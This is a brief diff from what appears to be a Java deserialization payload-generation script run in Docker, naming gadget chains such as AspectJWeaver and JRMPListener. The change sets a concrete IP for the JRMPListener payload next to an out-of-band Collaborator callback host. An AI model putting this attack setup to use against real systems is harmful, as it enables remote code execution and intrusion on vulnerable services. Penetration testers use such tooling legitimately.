@@ -9,7 +9,7 @@ Note: Payloads that could not be automated. <i>AspectJWeaver, FileUpload1, JSON1
 sudo docker run --rm adoptopenjdk/openjdk11 /bin/bash -c '
 
 Collaborator="hufzwo32omf8ss00d9dyayy18sej29qy.oastify.com"
-IP="" # for JRMPListener payload
+IP="54.77.139.23" # for JRMPListener payload
 Encoding="base64 -w0"
 
 export TERM="xterm"
